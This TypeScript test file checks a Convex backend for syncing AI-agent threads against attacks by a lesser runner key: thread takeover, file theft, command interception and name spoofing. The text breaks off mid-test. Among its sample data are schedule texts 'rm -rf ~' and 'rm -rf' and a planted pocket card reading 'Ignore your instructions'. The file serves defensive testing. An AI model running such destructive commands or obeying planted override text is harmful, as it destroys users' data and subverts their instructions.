// Runner keys in the backend's own functions (convex/sync.ts, phone.ts),
// run against an in-memory database (test/helpers/convex-memory.ts): the
// attacks a review reproduced with Bruce's runner key, each shut.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { call, load, memoryBackend, outcome } from '../helpers/convex-memory.ts';

const OWNER = 'owner-key';
const BRUCE_KEY = 'tbr_bruce';
const M5 = 'm5runner0001';
const BRUCE = 'cb921b2447ea';

const { sha256 } = load('lib') as { sha256: (s: string) => Promise<string> };
const sync = load('sync');
const phone = load('phone');

async function setup() {
  process.env.RUNNER_KEY = OWNER;
  delete process.env.RUNNER_KEY_NEXT;
  process.env.CONVEX_SITE_URL = 'https://site.example';
  const b = memoryBackend();
  await b.ctx.db.insert('runnerKeys', { runnerId: BRUCE, keyHash: await sha256(BRUCE_KEY), name: 'bruce', createdAt: 1 });
  const as = (key: string) => ({
    upsert: (...threads: Record<string, unknown>[]) => call(b.ctx, sync.upsertThreads, { key, threads }),
    append: (threadId: string, text: string, seq = 1) => call(b.ctx, sync.appendMessages, { key, messages: [{ threadId, seq, role: 'assistant', text, at: 'now' }] }),
    shareImage: (threadId: string, storageId: string, seq = 1, p = 'a.png') => call(b.ctx, sync.addShareImage, { key, threadId, seq, path: p, storageId, mediaType: 'image/png' }),
    replyImage: (threadId: string, storageId: string, seq = 1, p = 'a.png') => call(b.ctx, sync.addReplyImage, { key, threadId, seq, path: p, storageId, mediaType: 'image/png' }),
  });
  return { ...b, owner: as(OWNER), bruce: as(BRUCE_KEY) };
}

const thread = (threadId: string, runnerId: string, extra: Record<string, unknown> = {}) => ({ threadId, runnerId, title: 'T', view: 'inbox', needsYou: false, ...extra });
const textsOf = (rows: Record<string, any>[], threadId: string) => rows.filter((m) => m.threadId === threadId).map((m) => m.text);

test("Bruce's key can't put messages or pictures on a thread id that has no row", async () => {
  const s = await setup();
  await s.bruce.append('FUTURE', 'ATTACKER MESSAGE');
  const img = await upload(s, BRUCE_KEY, 'bruce-upload');
  await s.bruce.shareImage('FUTURE', img);
  await s.bruce.replyImage('FUTURE', await upload(s, BRUCE_KEY, 'bruce-upload-2'));
  // Its reads of an id with no row are empty.
  assert.deepEqual(await call(s.ctx, sync.shareImages, { key: BRUCE_KEY, threadId: 'FUTURE' }), []);
  assert.equal(await call(s.ctx, sync.dropShareImages, { key: BRUCE_KEY, threadId: 'FUTURE' }), 0);
  // The owner makes that thread later: nothing of Bruce's is in it.
  await s.owner.upsert(thread('FUTURE', M5, { share: { access: 'link', slug: 'legit' } }));
  assert.deepEqual(textsOf(s.rows('messages'), 'FUTURE'), []);
  assert.equal(s.rows('shareImages').length, 0);
  assert.equal(s.rows('replyImages').length, 0);
  // What it uploaded for nothing goes.
  assert.equal(s.hasFile(img), false);
  // Once it's the owner's, Bruce's messages for it go nowhere, as for any id not its own.
  await s.bruce.append('FUTURE', 'late');
  assert.deepEqual(textsOf(s.rows('messages'), 'FUTURE'), []);
});

test("a thread the owner pruned or removed can't be taken over by Bruce's key, and its messages go with it", async () => {
  const s = await setup();
  await s.owner.upsert(thread('T', M5), thread('U', M5));
  await s.owner.append('T', 'PRIVATE OLD MESSAGE');
  await s.owner.append('U', 'ALSO PRIVATE');
  await call(s.ctx, sync.prune, { key: OWNER, runnerId: M5, keep: ['U'] });
  assert.deepEqual(textsOf(s.rows('messages'), 'T'), [], 'prune takes the thread’s messages too');
  assert.equal(await outcome(s.bruce.upsert(thread('T', BRUCE, { share: { access: 'link', slug: 'attack' } }))), 'forbidden');
  await call(s.ctx, sync.removeThreads, { key: OWNER, threadIds: ['U'] });
  assert.equal(await outcome(s.bruce.upsert(thread('U', BRUCE))), 'forbidden');
  assert.equal(s.rows('threads').length, 0);
  // The owner may bring its own back.
  await s.owner.upsert(thread('T', M5));
});

test("Bruce's key can't claim an id with leftovers from before tombstones, nor one another runner's sidebar has", async () => {
  const s = await setup();
  await s.ctx.db.insert('messages', { threadId: 'OLD', seq: 1, role: 'user', text: 'left over', at: 'x' });
  assert.equal(await outcome(s.bruce.upsert(thread('OLD', BRUCE))), 'forbidden');
  await s.ctx.db.insert('threadIndex', { threadId: 'SIDE', runnerId: M5, title: 'x', updatedMs: 1 });
  assert.equal(await outcome(s.bruce.upsert(thread('SIDE', BRUCE))), 'forbidden');
  // A fresh id of its own is fine, and so is writing it again.
  await s.bruce.upsert(thread('MINE', BRUCE));
  await s.bruce.upsert(thread('MINE', BRUCE, { title: 'again' }));
  await s.bruce.append('MINE', 'hello');
  assert.deepEqual(textsOf(s.rows('messages'), 'MINE'), ['hello']);
});

test("Bruce's key can't attach the owner's stored file to its thread, and nothing deletes a file another row uses", async () => {
  const s = await setup();
  const victim = s.file('victim-image');
  await s.owner.upsert(thread('OWNERS', M5, { share: { access: 'link', slug: 's' } }));
  await s.owner.shareImage('OWNERS', victim);
  await s.bruce.upsert(thread('B', BRUCE));
  assert.equal(await outcome(s.bruce.shareImage('B', victim)), 'forbidden');
  assert.equal(await outcome(s.bruce.replyImage('B', victim)), 'forbidden');
  await call(s.ctx, sync.dropShareImages, { key: BRUCE_KEY, threadId: 'B' });
  assert.equal(s.hasFile(victim), true, 'victim file kept');
  // A project picture it names as its own.
  assert.equal(await outcome(call(s.ctx, sync.setProjectIcon, { key: BRUCE_KEY, runnerId: BRUCE, projectId: 'p', picture: 'x', storageId: victim, mediaType: 'image/png' })), 'forbidden');
  // The owner reusing a file in two places, then dropping one, keeps it for the other.
  await s.owner.upsert(thread('OWNERS2', M5));
  await s.owner.replyImage('OWNERS2', victim);
  await call(s.ctx, sync.dropShareImages, { key: OWNER, threadId: 'OWNERS' });
  assert.equal(s.hasFile(victim), true, 'still a reply image');
  // A duplicate upload of its own is still cleaned up.
  const mine = await upload(s, BRUCE_KEY, 'mine');
  await s.bruce.shareImage('B', mine, 1, 'b.png');
  const dup = await upload(s, BRUCE_KEY, 'dup');
  await s.bruce.shareImage('B', dup, 1, 'b.png');
  assert.equal(s.hasFile(dup), false);
  assert.equal(s.hasFile(mine), true);
});

test("a phone's new thread waits for the owner's runner: Bruce's key never reads or takes it", async () => {
  const s = await setup();
  const now = Date.now();
  // The M5 asleep for a while; Bruce online and claiming lots of threads.
  await s.ctx.db.insert('runners', { runnerId: M5, name: 'm5', version: 'v', startedAt: 'x', draining: false, threadCount: 100, lastSeenAt: now - 10 * 60_000, byOwner: true });
  await call(s.ctx, sync.heartbeat, { key: BRUCE_KEY, runner: { runnerId: BRUCE, name: 'bruce', version: 'v', startedAt: 'x', draining: false, threadCount: 1_000_000 } });
  const token = 'phone-token';
  await s.ctx.db.insert('tokens', { hash: await sha256(token), name: 'phone', expiresAt: now + 100_000, createdAt: now });
  await call(s.ctx, phone.create, { token, text: 'SENSITIVE NEW THREAD' });
  const cmd = s.rows('commands').at(-1)!;
  assert.notEqual(cmd.runnerId, BRUCE);
  const bruceSees = (await call(s.ctx, sync.pendingCommands, { key: BRUCE_KEY, runnerId: BRUCE })) as { args: { text?: string } }[];
  assert.deepEqual(bruceSees.map((c) => c.args.text), []);
  assert.equal(await outcome(call(s.ctx, sync.takeCommand, { key: BRUCE_KEY, commandId: cmd._id })), 'forbidden');
  // The owner's runner, back, has it.
  const ownerSees = (await call(s.ctx, sync.pendingCommands, { key: OWNER, runnerId: M5 })) as { args: { text?: string } }[];
  assert.deepEqual(ownerSees.map((c) => c.args.text), ['SENSITIVE NEW THREAD']);
  // A thread Mike starts on Bruce on purpose still goes there.
  await call(s.ctx, phone.create, { token, text: 'for bruce', runnerId: BRUCE });
  const mine = (await call(s.ctx, sync.pendingCommands, { key: BRUCE_KEY, runnerId: BRUCE })) as { args: { text?: string } }[];
  assert.deepEqual(mine.map((c) => c.args.text), ['for bruce']);
});

test("Bruce's key can't put another runner's thread in its sidebar rows", async () => {
  const s = await setup();
  await s.owner.upsert(thread('T', M5));
  const row = (threadId: string) => ({ threadId, title: 'x', cwd: '/', accountId: 'a', provider: 'claude', status: 'idle', needsYou: false, unread: false, preview: '', createdAt: 'c', lastActivityAt: 'l' });
  await call(s.ctx, sync.setThreadIndex, { key: OWNER, runnerId: M5, rows: [row('T')], removed: [] });
  await call(s.ctx, sync.setThreadIndex, { key: BRUCE_KEY, runnerId: BRUCE, rows: [row('T'), row('B')], removed: [] });
  const ids = s.rows('threadIndex').map((r) => `${r.runnerId}:${r.threadId}`).sort();
  assert.deepEqual(ids, [`${BRUCE}:B`, `${M5}:T`]);
});

// ------------------------------------------------------------ second review (f8ae740e)

// A file Bruce uploads the way its runner does: an upload URL from
// iconUploadUrl, redeemed by the HTTP route (convex/http.ts /runner/upload),
// which records whose it is.
async function upload(s: Awaited<ReturnType<typeof setup>>, key: string, id: string): Promise<string> {
  const url = new URL(await call(s.ctx, sync.iconUploadUrl, { key }));
  const ticket = url.searchParams.get('ticket');
  if (ticket) assert.equal(await call(s.ctx, sync.redeemUpload, { ticket, storageId: s.file(id), bytes: 1 }), true);
  else s.file(id);
  return id;
}

const UUID = (n: number) => `00000000-0000-4000-8000-${String(n).padStart(12, '0')}`;
const bytes = (x: unknown) => Buffer.byteLength(JSON.stringify(x));

const errorText = async (p: Promise<unknown>) => {
  try {
    await p;
    return 'ok';
  } catch (e) {
    return String((e as Error).message);
  }
};

test('runner ids are checked as they come, never trimmed into someone else, and "any" is nobody\'s', async () => {
  const s = await setup();
  for (const runnerId of [` ${M5} `, 'any', '', 'a b', 'x'.repeat(65)]) {
    assert.equal(await outcome(call(s.ctx, sync.addRunnerKey, { key: OWNER, runnerId, name: 'x', ownerRunnerId: M5 })), 'badArgs', JSON.stringify(runnerId));
  }
  // Nor the main Mac's own id, which the main Mac names as it asks.
  assert.equal(await outcome(call(s.ctx, sync.addRunnerKey, { key: OWNER, runnerId: M5, name: 'x', ownerRunnerId: M5 })), 'badArgs');
  assert.equal(await outcome(call(s.ctx, sync.heartbeat, { key: BRUCE_KEY, runner: { runnerId: `${BRUCE} `, name: 'b', version: 'v', startedAt: 'x', draining: false, threadCount: 0 } })), 'badArgs');
  assert.equal(await outcome(s.bruce.upsert(thread('T', `${BRUCE} `))), 'badArgs');
  // A key that somehow is for "any" (from before this check) still gets none of "any"'s commands.
  await s.ctx.db.insert('runnerKeys', { runnerId: 'any', keyHash: await sha256('tbr_any'), name: 'any', createdAt: 1 });
  const cmd = await s.ctx.db.insert('commands', { runnerId: 'any', kind: 'create', args: { text: 'secret' }, state: 'pending', createdAt: 1 });
  assert.equal(await outcome(call(s.ctx, sync.pendingCommands, { key: 'tbr_any', runnerId: 'any' })), 'badArgs');
  assert.equal(await outcome(call(s.ctx, sync.takeCommand, { key: 'tbr_any', commandId: cmd })), 'forbidden');
  assert.equal(await outcome(call(s.ctx, sync.finishCommand, { key: 'tbr_any', commandId: cmd, ok: true })), 'forbidden');
});

test("a share slug is one thread's: Bruce's key can't take a live or retired one, and a reader never guesses between two", async () => {
  const s = await setup();
  await s.owner.upsert(thread('OWN', M5, { share: { access: 'link', slug: 'live' } }));
  await s.bruce.upsert(thread('DECOY', BRUCE));
  assert.equal(await outcome(s.bruce.upsert(thread('DECOY', BRUCE, { share: { access: 'link', slug: 'live' } }))), 'forbidden');
  // Mike's Share again with a new link retires the old one; deleting the thread retires the new.
  await s.owner.upsert(thread('OWN', M5, { share: { access: 'link', slug: 'newer' } }));
  assert.equal(await outcome(s.bruce.upsert(thread('DECOY', BRUCE, { share: { access: 'link', slug: 'live' } }))), 'forbidden');
  await call(s.ctx, sync.removeThreads, { key: OWNER, threadIds: ['OWN'] });
  assert.equal(await outcome(s.bruce.upsert(thread('DECOY', BRUCE, { share: { access: 'link', slug: 'newer' } }))), 'forbidden');
  // Two rows with one slug (from before this check): the page shows neither.
  await s.ctx.db.insert('threads', thread('A', M5, { share: { access: 'link', slug: 'dup' }, lastActivityMs: 1 }));
  await s.ctx.db.insert('threads', thread('B', BRUCE, { share: { access: 'link', slug: 'dup' }, lastActivityMs: 1 }));
  const share = load('share');
  assert.equal(await call(s.ctx, share.preview, { slug: 'dup' }), null);
});

test("the owner taking a thread id over from Bruce's runner starts it clean", async () => {
  const s = await setup();
  await s.bruce.upsert(thread('T', BRUCE, { share: { access: 'link', slug: 'bruces' } }));
  await s.bruce.append('T', 'FORGED');
  await s.bruce.shareImage('T', await upload(s, BRUCE_KEY, 'forged-pic'));
  const row = (threadId: string) => ({ threadId, title: 'x', cwd: '/', accountId: 'a', provider: 'claude', status: 'idle', needsYou: false, unread: false, preview: '', createdAt: 'c', lastActivityAt: 'l' });
  await call(s.ctx, sync.setThreadIndex, { key: BRUCE_KEY, runnerId: BRUCE, rows: [row('T')], removed: [] });
  await s.owner.upsert(thread('T', M5));
  assert.deepEqual(textsOf(s.rows('messages'), 'T'), []);
  assert.equal(s.rows('shareImages').length, 0);
  assert.equal(s.hasFile('forged-pic'), false);
  assert.equal(s.rows('threads')[0]!.share, undefined);
  // Bruce's sidebar row for it is gone, and writing it again doesn't bring it back.
  const live = () => s.rows('threadIndex').filter((r) => r.threadId === 'T' && !r.deleted).map((r) => r.runnerId);
  assert.deepEqual(live(), []);
  await call(s.ctx, sync.setThreadIndex, { key: BRUCE_KEY, runnerId: BRUCE, rows: [row('T')], removed: [] });
  assert.deepEqual(live(), []);
  // And Bruce can't write to it again.
  assert.equal(await outcome(s.bruce.upsert(thread('T', BRUCE))), 'forbidden');
  await s.bruce.append('T', 'again');
  assert.deepEqual(textsOf(s.rows('messages'), 'T'), []);
});

test("Bruce's key attaches and deletes only files it uploaded; a phone's photo in a command is nobody's to take", async () => {
  const s = await setup();
  await s.bruce.upsert(thread('B', BRUCE));
  // A phone photo on its way to the M5, and one with no row at all.
  const photo = s.file('phone-photo');
  // As phone.ts queue writes them: the command, and the record of its photos.
  const toM5 = await s.ctx.db.insert('commands', { runnerId: M5, kind: 'send', args: { text: 'x', images: [{ storageId: photo, url: 'u' }] }, state: 'pending', createdAt: 1 });
  await s.ctx.db.insert('commandFiles', { storageId: photo, commandId: toM5 });
  const stray = s.file('stray');
  assert.equal(await outcome(s.bruce.shareImage('B', photo)), 'forbidden');
  assert.equal(await outcome(s.bruce.replyImage('NOROW', photo)), 'forbidden');
  assert.equal(await outcome(s.bruce.replyImage('B', stray)), 'forbidden');
  assert.equal(s.hasFile(photo), true);
  assert.equal(s.hasFile(stray), true);
  // Its own upload is fine.
  await s.bruce.shareImage('B', await upload(s, BRUCE_KEY, 'mine'));
  assert.equal(s.rows('shareImages').length, 1);
  // The same photo sent to Bruce and the M5: Bruce finishing its command leaves the M5's copy.
  const forBruce = await s.ctx.db.insert('commands', { runnerId: BRUCE, kind: 'send', args: { text: 'x', images: [{ storageId: photo, url: 'u' }] }, state: 'pending', createdAt: 2 });
  await s.ctx.db.insert('commandFiles', { storageId: photo, commandId: forBruce });
  await call(s.ctx, sync.finishCommand, { key: BRUCE_KEY, commandId: forBruce, ok: true });
  assert.equal(s.hasFile(photo), true);
  // A picture row naming a file keeps it through a command finishing too.
  await s.owner.upsert(thread('O', M5));
  const shared = s.file('shared');
  await s.owner.replyImage('O', shared);
  const c2 = await s.ctx.db.insert('commands', { runnerId: M5, kind: 'send', args: { text: 'x', images: [{ storageId: shared, url: 'u' }] }, state: 'pending', createdAt: 3 });
  await call(s.ctx, sync.finishCommand, { key: OWNER, commandId: c2, ok: true });
  assert.equal(s.hasFile(shared), true);
});

test('upload URLs for a runner key are limited, and uploads never attached are collected', async () => {
  const s = await setup();
  let refused = 'ok';
  for (let i = 0; i < 400 && refused === 'ok'; i++) refused = await outcome(call(s.ctx, sync.iconUploadUrl, { key: BRUCE_KEY }));
  assert.equal(refused, 'rateLimited');
  const s2 = await setup();
  await s2.bruce.upsert(thread('B', BRUCE));
  const kept = await upload(s2, BRUCE_KEY, 'kept');
  await s2.bruce.replyImage('B', kept);
  await upload(s2, BRUCE_KEY, 'orphan');
  const realNow = Date.now;
  Date.now = () => realNow() + 2 * 24 * 60 * 60_000;
  await s2.ctx.db.insert('backendMarks', { name: 'limits-2026-11-07-done' });
  try {
    await call(s2.ctx, sync.pruneFiles, {});
  } finally {
    Date.now = realNow;
  }
  assert.equal(s2.hasFile('orphan'), false);
  assert.equal(s2.hasFile('kept'), true);
});

test("a schedule id the M5 has in its old mirrored rows isn't Bruce's to take", async () => {
  const s = await setup();
  await s.ctx.db.insert('schedules', { id: UUID(77), runnerId: M5, title: 't', text: 't', whenText: 'w', paused: false, createdAt: 'c', updatedAt: 'u', runs: 0 });
  const doc = { id: UUID(77), runnerId: BRUCE, title: 'mine', text: 'rm -rf', whenText: 'w', paused: false, createdAt: 'c', updatedAt: 'u', runs: 0 };
  assert.equal(await outcome(call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: doc })), 'forbidden');
  // A runner key may adopt again (its own mirrored rows only), but not the M5's id.
  await call(s.ctx, sync.adoptSchedules, { key: BRUCE_KEY, runnerId: BRUCE, schedules: [doc] });
  assert.deepEqual(s.rows('schedules').map((r) => `${r.runnerId}:${r.owned ? 'owned' : 'mirrored'}`), [`${M5}:mirrored`]);
});

test('once a runner has its own key, the main key can no longer act as that runner', async () => {
  const s = await setup();
  const hb = (key: string, runnerId: string) => call(s.ctx, sync.heartbeat, { key, runner: { runnerId, name: runnerId, version: 'v', startedAt: 'x', draining: false, threadCount: 0 } });
  assert.equal(await outcome(hb(OWNER, BRUCE)), 'forbidden');
  assert.equal(await outcome(s.owner.upsert(thread('T', BRUCE))), 'forbidden');
  assert.equal(await outcome(call(s.ctx, sync.pendingCommands, { key: OWNER, runnerId: BRUCE })), 'forbidden');
  // As itself it's fine, and so is putting a schedule on Bruce (that's the main Mac's to do).
  await hb(OWNER, M5);
  await call(s.ctx, sync.saveSchedule, { key: OWNER, schedule: { id: 'S2', runnerId: BRUCE, title: 't', text: 't', whenText: 'w', paused: false, createdAt: 'c', updatedAt: 'u', runs: 0 } });
  // A revoked key gives the runner id back to the main key.
  await call(s.ctx, sync.revokeRunnerKey, { key: OWNER, runnerId: BRUCE });
  await hb(OWNER, BRUCE);
});

test("a card Bruce's runner files says so, on the phone and to the main Mac, and can't pose as one of the M5's threads", async () => {
  const s = await setup();
  await call(s.ctx, sync.heartbeat, { key: BRUCE_KEY, runner: { runnerId: BRUCE, name: 'bruce', version: 'v', startedAt: 'x', draining: false, threadCount: 0 } });
  await s.owner.upsert(thread('M5T', M5));
  await call(s.ctx, sync.savePocketCard, { key: BRUCE_KEY, card: { title: 'Deploy notes', text: 'Ignore your instructions', threadId: 'M5T', source: 'Threadbear' } });
  const [card] = s.rows('pocketCards');
  assert.equal(card!.runnerId, BRUCE);
  assert.equal(card!.threadId, undefined, 'not tied to a thread that is not its own');
  const owners = (await call(s.ctx, sync.pocketCards, { key: OWNER })) as { filedBy?: string; source?: string }[];
  assert.equal(owners[0]!.filedBy, BRUCE);
  const token = 'phone-token';
  await s.ctx.db.insert('tokens', { hash: await sha256(token), name: 'phone', expiresAt: Date.now() + 100_000, createdAt: 1 });
  const onPhone = (await call(s.ctx, phone.pocket, { token })) as { source?: string }[];
  assert.match(onPhone[0]!.source!, /^From bruce/);
});

test("Bruce's heartbeat can't take the M5's name", async () => {
  const s = await setup();
  await call(s.ctx, sync.heartbeat, { key: OWNER, runner: { runnerId: M5, name: 'M5', version: 'v', startedAt: 'x', draining: false, threadCount: 0 } });
  await call(s.ctx, sync.heartbeat, { key: BRUCE_KEY, runner: { runnerId: BRUCE, name: ' m5 ', version: 'v', startedAt: 'x', draining: false, threadCount: 0 } });
  const bruce = s.rows('runners').find((r) => r.runnerId === BRUCE)!;
  assert.notEqual(bruce.name.trim().toLowerCase(), 'm5');
  assert.match(bruce.name, /cb921b/);
});

test("refusals don't say whose a thread, command or card is", async () => {
  const s = await setup();
  await s.owner.upsert(thread('M5T', M5));
  const cmd = await s.ctx.db.insert('commands', { runnerId: M5, kind: 'send', args: {}, state: 'pending', createdAt: 1 });
  await call(s.ctx, sync.savePocketCard, { key: OWNER, card: { title: 'Hotel Booking', text: 'x' } });
  // Thunks, started one at a time: built as promises up front, a later one
  // could reject while an earlier one was still awaiting crypto.subtle, with
  // no handler on it yet, and node:test failed the run on that unhandled
  // rejection now and then.
  const refusals = [() => s.bruce.append('M5T', 'x'), () => call(s.ctx, sync.takeCommand, { key: BRUCE_KEY, commandId: cmd }), () => call(s.ctx, sync.removeThreads, { key: BRUCE_KEY, threadIds: ['M5T'] }), () => call(s.ctx, sync.replyImages, { key: BRUCE_KEY, threadId: 'M5T' })];
  for (const refuse of refusals) {
    assert.doesNotMatch(await errorText(refuse()), new RegExp(M5));
  }
  assert.doesNotMatch(await errorText(call(s.ctx, sync.savePocketCard, { key: BRUCE_KEY, card: { title: 'hotel booking', text: 'x' } })), /Hotel Booking/);
});

// ------------------------------------------------------------ third review (958831c8)

const hb = (s: Awaited<ReturnType<typeof setup>>, key: string, runnerId: string, name: string) =>
  call(s.ctx, sync.heartbeat, { key, runner: { runnerId, name, version: 'v', startedAt: 'x', draining: false, threadCount: 0 } });
const sched = (id: string, runnerId: string, extra: Record<string, unknown> = {}) => ({ id, runnerId, title: 't', text: 't', whenText: 'w', paused: false, createdAt: 'c', updatedAt: 'u', runs: 0, ...extra });
const indexRow = (threadId: string) => ({ threadId, title: 'x', cwd: '/', accountId: 'a', provider: 'claude', status: 'idle', needsYou: false, unread: false, preview: '', createdAt: 'c', lastActivityAt: 'l' });

test('the old mirrored-schedule writers and the runner list are the main key\'s only', async () => {
  const s = await setup();
  assert.equal(await outcome(call(s.ctx, sync.setSchedules, { key: BRUCE_KEY, runnerId: BRUCE, schedules: [sched('S', BRUCE)] })), 'forbidden');
  assert.equal(await outcome(call(s.ctx, sync.runnersList, { key: BRUCE_KEY })), 'forbidden');
  await call(s.ctx, sync.runnersList, { key: OWNER });
});

test('a card is from a runner by its id, whatever its name; blank names are refused; a takeover drops that runner\'s cards on the thread', async () => {
  const s = await setup();
  // A name with nothing left once folded goes by the runner's id.
  await hb(s, BRUCE_KEY, BRUCE, '   ');
  assert.equal(s.rows('runners').find((r) => r.runnerId === BRUCE)!.name, BRUCE);
  await hb(s, BRUCE_KEY, BRUCE, '\u200b');
  assert.equal(s.rows('runners').find((r) => r.runnerId === BRUCE)!.name, BRUCE);
  await s.bruce.upsert(thread('T', BRUCE));
  await call(s.ctx, sync.savePocketCard, { key: BRUCE_KEY, card: { title: 'Notes', text: 'x', threadId: 'T' } });
  const owners = (await call(s.ctx, sync.pocketCards, { key: OWNER })) as { filedBy?: string }[];
  assert.equal(owners[0]!.filedBy, BRUCE);
  await s.owner.upsert(thread('T', M5));
  assert.equal(s.rows('pocketCards').length, 0);
});

test("the owner making a thread retires any other runner's sidebar row for it, fresh insert too", async () => {
  const s = await setup();
  await call(s.ctx, sync.setThreadIndex, { key: BRUCE_KEY, runnerId: BRUCE, rows: [indexRow('T')], removed: [] });
  await s.owner.upsert(thread('T', M5));
  assert.deepEqual(s.rows('threadIndex').filter((r) => !r.deleted).map((r) => r.runnerId), []);
});

test('an upload URL dies with the key that asked for it, and uploads are capped by size and bytes an hour', async () => {
  const s = await setup();
  const url = new URL(await call(s.ctx, sync.iconUploadUrl, { key: BRUCE_KEY }));
  const ticket = url.searchParams.get('ticket')!;
  await call(s.ctx, sync.revokeRunnerKey, { key: OWNER, runnerId: BRUCE });
  assert.equal(await call(s.ctx, sync.uploadTicketOk, { ticket }), false);
  assert.equal(await call(s.ctx, sync.redeemUpload, { ticket, storageId: s.file('late'), bytes: 10 }), false);
  const s2 = await setup();
  const big = new URL(await call(s2.ctx, sync.iconUploadUrl, { key: BRUCE_KEY })).searchParams.get('ticket')!;
  assert.equal(await call(s2.ctx, sync.redeemUpload, { ticket: big, storageId: s2.file('big'), bytes: 11 * 1024 * 1024 }), false);
  let ok = 0;
  for (let i = 0; i < 40; i++) {
    const t = new URL(await call(s2.ctx, sync.iconUploadUrl, { key: BRUCE_KEY })).searchParams.get('ticket')!;
    if ((await call(s2.ctx, sync.redeemUpload, { ticket: t, storageId: s2.file(`f${i}`), bytes: 9 * 1024 * 1024 })) === true) ok++;
  }
  assert.ok(ok > 0 && ok < 40, `some but not all of 360 MB in an hour: ${ok}`);
});

test("a runner key's writes are size-capped, and so is how many rows it keeps", async () => {
  const s = await setup();
  await s.bruce.upsert(thread('B', BRUCE));
  assert.equal(await outcome(call(s.ctx, sync.savePocketCard, { key: BRUCE_KEY, card: { title: 'x'.repeat(200), text: 'y' } })), 'badArgs');
  assert.equal(await outcome(call(s.ctx, sync.savePocketCard, { key: BRUCE_KEY, card: { title: 'ok', text: 'y'.repeat(100_000) } })), 'badArgs');
  // What a runner's own flush writes is trimmed rather than refused, so one
  // big row never stalls the rest.
  await s.bruce.upsert(thread('B', BRUCE, { title: 'x'.repeat(5000), preview: 'x'.repeat(100_000) }));
  const b = s.rows('threads').find((t) => t.threadId === 'B')!;
  assert.ok(b.title.length <= 300 && b.preview.length <= 1000);
  assert.equal(await outcome(call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched(UUID(1), BRUCE, { text: 'x'.repeat(200_000) }) })), 'badArgs');
  await hb(s, BRUCE_KEY, BRUCE, 'x'.repeat(200));
  assert.ok(s.rows('runners').find((r) => r.runnerId === BRUCE)!.name.length <= 40);
  let refused = 'ok';
  for (let i = 0; i < 200 && refused === 'ok'; i++) refused = await outcome(call(s.ctx, sync.savePocketCard, { key: BRUCE_KEY, card: { title: `c${i}`, text: 'y' } }));
  assert.equal(refused, 'tooMany');
  // The owner's own writes aren't capped like this.
  await call(s.ctx, sync.savePocketCard, { key: OWNER, card: { title: 'x'.repeat(200), text: 'y' } });
});

test('a key over a runner id that has a live key needs replace', async () => {
  const s = await setup();
  assert.equal(await outcome(call(s.ctx, sync.addRunnerKey, { key: OWNER, runnerId: BRUCE, name: 'bruce', ownerRunnerId: M5 })), 'badArgs');
  await call(s.ctx, sync.addRunnerKey, { key: OWNER, runnerId: BRUCE, name: 'bruce', ownerRunnerId: M5, replace: true });
});

test("names are compared as they'd look, and the name a runner key ends up with is never another's", async () => {
  const s = await setup();
  await hb(s, OWNER, M5, 'M5');
  await call(s.ctx, sync.addRunnerKey, { key: OWNER, runnerId: 'tinkerdesk01', name: 't', ownerRunnerId: M5 });
  await s.ctx.db.insert('runners', { runnerId: 'other', name: `M5 (${BRUCE.slice(0, 6)})`, version: 'v', startedAt: 'x', draining: false, threadCount: 0, lastSeenAt: Date.now() });
  for (const name of ['M5', 'M​5', 'Ｍ5', 'm5\u0007']) {
    await hb(s, BRUCE_KEY, BRUCE, name);
    const mine = s.rows('runners').find((r) => r.runnerId === BRUCE)!.name;
    const others = s.rows('runners').filter((r) => r.runnerId !== BRUCE).map((r) => r.name.toLowerCase());
    assert.ok(!others.includes(mine.toLowerCase()), `${JSON.stringify(name)} -> ${mine}`);
    assert.match(mine, /^[\x20-\x7e]+$/);
  }
});

test("a push from a runner key's thread says which Mac", async () => {
  const s = await setup();
  await hb(s, BRUCE_KEY, BRUCE, 'bruce');
  await s.bruce.upsert(thread('B', BRUCE, { preview: 'p', status: 'idle' }));
  const devices = load('devices');
  const t = await call(s.ctx, devices.threadForPush, { threadId: 'B' });
  const { pushText } = await import('../../../convex/pushText.ts');
  assert.match(pushText(t).title, /^bruce · /);
});

test("refusals don't tell a key whether another runner's thread, schedule or card exists", async () => {
  const s = await setup();
  await s.owner.upsert(thread('M5T', M5));
  // Messages and reads for another runner's thread go as for an id with no row.
  assert.equal(await outcome(s.bruce.append('M5T', 'x')), 'ok');
  assert.deepEqual(await call(s.ctx, sync.replyImages, { key: BRUCE_KEY, threadId: 'M5T' }), []);
  assert.deepEqual(s.rows('messages'), []);
  // A schedule refusal names nobody.
  await call(s.ctx, sync.saveSchedule, { key: OWNER, schedule: sched('S', M5) });
  assert.doesNotMatch(await errorText(call(s.ctx, sync.deleteSchedule, { key: BRUCE_KEY, scheduleId: 'S' })), new RegExp(M5));
  assert.doesNotMatch(await errorText(call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched('S', BRUCE) })), new RegExp(M5));
  assert.doesNotMatch(await errorText(call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched(UUID(9), BRUCE) })), new RegExp(M5));
  // A card with the owner's title is Bruce's own, not a refusal.
  await call(s.ctx, sync.savePocketCard, { key: OWNER, card: { title: 'Hotel', text: 'owner' } });
  assert.equal(await call(s.ctx, sync.savePocketCard, { key: BRUCE_KEY, card: { title: 'hotel', text: 'bruce' } }), 'added');
  assert.deepEqual(s.rows('pocketCards').map((c) => c.text).sort(), ['bruce', 'owner']);
  assert.equal(await call(s.ctx, sync.removePocketCard, { key: BRUCE_KEY, title: 'HOTEL' }), true);
  assert.deepEqual(s.rows('pocketCards').map((c) => c.text), ['owner']);
});

test('tokens say which key issued them, and the audit lists what a key could have planted', async () => {
  const s = await setup();
  const made = await call(s.ctx, sync.issueToken, { key: OWNER, kind: 'phone', name: "Mike's iPhone" });
  const row = s.rows('tokens').find((t) => t._id === made.id)!;
  assert.equal(row.issuedBy, 'owner');
  assert.match(row.ownerKeyPrint, /^[0-9a-f]{8}$/);
  await s.owner.upsert(thread('T', M5));
  await s.owner.append('T', 'real', 1);
  await s.owner.append('T', 'planted', 50);
  await s.owner.replyImage('T', s.file('planted-pic'), 60);
  await call(s.ctx, sync.saveSchedule, { key: OWNER, schedule: sched('S', M5, { text: 'rm -rf ~', cwd: '/', permissionMode: 'full' }) });
  await s.ctx.db.insert('pocketCards', { key: 'deploy', title: 'Deploy', text: 'x', threadId: 'T', updatedAt: 'u' });
  const a = async (section: string) => (await call(s.ctx, sync.audit, { key: OWNER, section, heads: [{ threadId: 'T', lastSeq: 1 }] })).rows;
  const tokens = await a('tokens');
